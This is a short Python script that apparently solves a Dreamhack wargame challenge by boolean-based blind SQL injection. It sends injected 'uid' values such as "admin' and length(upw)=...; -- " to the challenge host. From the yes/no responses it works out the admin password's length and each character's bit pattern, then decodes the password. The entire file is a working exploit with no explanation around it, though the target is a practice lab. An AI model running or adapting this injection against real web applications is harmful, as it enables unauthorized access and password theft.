import requests


pw_length = 0
while True:
    print("\rpw length: "+str(pw_length), end="")
    url="http://host3.dreamhack.games:15698/?uid=admin' and length(upw)="+str(pw_length)+"; -- "
    if (requests.get(url).text.find("exists") != -1): break
    pw_length += 1

print()


pw_lengths=[]

for i in range(pw_length):
    length = 0

    while True:
        print("\r"+str(i+1)+" char length: "+str(length), end="")
        url = "http://host3.dreamhack.games:15698/?uid=admin' and length(bin(ord(substr(upw,"+str(i+1)+",1))))="+str(length)+"; -- "
        if (requests.get(url).text.find("exists") != -1):
            pw_lengths.append(length)
            print()
            break
        length += 1

print(pw_lengths)


pw_bits=[]
for idx, i in enumerate(pw_lengths):
    bits = ""
    for j in range(i):
        print("\r"+str(idx)+" char bit: "+bits, end="")
        url = "http://host3.dreamhack.games:15698/?uid=admin' and substr(bin(ord(substr(upw," + str(idx + 1) + ",1))),"+str(j+1)+",1)=1; -- "
        if (requests.get(url).text.find("exists") != -1):
            bits += "1"
        else:
            bits += "0"
    pw_bits.append(bits)
    print()

password = ""
for i in pw_bits:
    print("\rpassword: "+password, end="")
    password += int.to_bytes(int(i,2),(len(i)+7)//8,"big").decode("utf-8")